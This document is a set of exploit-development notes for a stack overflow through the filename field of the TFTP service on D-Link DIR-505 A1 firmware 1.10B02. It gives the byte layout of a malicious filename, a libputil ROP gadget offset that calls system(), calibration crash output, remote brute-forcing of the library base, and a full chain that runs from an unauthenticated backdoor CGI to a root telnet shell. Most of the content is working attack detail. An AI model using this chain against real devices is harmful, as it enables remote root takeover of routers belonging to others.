# ROP Analysis Notes — TFTP Filename Stack Overflow (DIR-505 A1, FW110B02)

Target: `/usr/bin/tftpd` + `/lib/libputil.so` of D-Link DIR-505 A1 firmware 1.10B02.
All offsets are relative to the `libputil.so` load base (ASLR-random per process, but constant for
the lifetime of the `tftpd` parent because it forks one child per request).

## 1. Two overflow sites and the stack mapping

```
tftp_receive_ext (tftpd)
 └─ mp_upload_file(filename, data, size)          [libputil]
     ├─ sprintf(buf64 = sp_mp+0x20, "/tmp/%s", filename)     <- overflow #1 (writes upward)
     └─ save_upload_file(path = "/tmp/"+filename, data, size)
         ├─ strcpy(buf30 = save_sp+0x18, path)                 <- overflow #2 (hijack point)
         ├─ fopen(buf30,"w") / fwrite / fclose
         └─ epilogue: lw $ra,0x4c($sp) -> jr $ra   ** hijack at this return **
```

Derived and verified:

- `save_sp = sp_mp - 0x50`
- Overflow #2 copies `path` upward from `save_sp+0x18`, therefore
  **`content(sp_mp + m) = filename[0x33 + m]`**
- At the hijack, `$sp = sp_mp` (after `save_upload_file`'s `addiu sp,0x50`)

## 2. Malicious filename layout

| filename offset | overwrites | value |
|---|---|---|
| 0..30 | filler | any byte except NUL |
| 31..42 | saved `$s0..$s3` of `save_upload_file` | irrelevant |
| 43..46 | filler | |
| **47..50** | **saved `$ra`** | **`libputil_base + 0x6838`** (big-endian) |
| 51..90 | filler (lands at `sp_mp+0..0x27`) | |
| **91..N-1** | **command string** (lands at `sp_mp+0x28`) | space-free ASCII; NUL added by `strcpy` |

Calibration: `filename[47..50] = 0xdeadbeef` produced the kernel dump
`epc: deadbeef / ra: deadbeef / BadVA: deadbeee` — exact return-address control.

## 3. Gadget (libputil + 0x6838)

```
0x6838  lw      $t9, -0x7e80($gp)   ; GOT slot -> system (lazy-binding stub -> libc)
0x683c  addiu   $s1, $sp, 0x28
0x6840  jalr    $t9
0x6844  move    $a0, $s1            ; delay slot: a0 = sp + 0x28
```

- `$gp` at the hijack is still libputil's `$gp` (restored in `save_upload_file`'s epilogue), so the
  GOT-relative load is valid.
- After `system()` returns, execution continues at `0x6848` (`lw $gp,0x18($sp)`), which loads
  attacker filler and crashes — expected; the command has already executed
  (crash evidence: `ra = base+0x6848`, `$gp = 0x41414141`).

## 4. Device quirks relevant to exploitation

1. **Filename whitespace truncation** — the daemon truncates the received filename at the first
   whitespace byte (verified: `echo ROP...` arrives as `echo`). Commands must be space-free:
   `id>/tmp/q`, `uname>/tmp/u`, `sh</tmp/x`.
2. No separate argument support — use `sh</tmp/script` to run a multi-line script previously
   planted via the service's unauthenticated file-write primitive.
3. `fopen("/tmp/<very long name>")` may fail (>255-byte path component) — irrelevant to the
   overflow because the `strcpy` happens before `fopen`.

## 5. Obtaining the libputil base

| Environment | Method |
|---|---|
| Lab (FirmAE, serial console) | `cat /proc/<tftpd pid>/maps` (match the tftpd process via `/proc/*/cmdline`) |
| Remote | information leak, or brute force: tftpd forks per request, wrong guesses only kill the forked child; base + stack layout stay constant for the parent's lifetime |

## 6. Full chain

```
(1) POST /secmark1524.cgi (unauthenticated backdoor)   -> root tftpd
(2) PUT filename "x" (arbitrary file write)            -> /tmp/x script
(3) PUT filename <ROP payload> (this overflow)         -> system("sh</tmp/x")
(4) script runs as root: telnetd -p 2327 -l /bin/sh
(5) attacker connects -> root shell
```
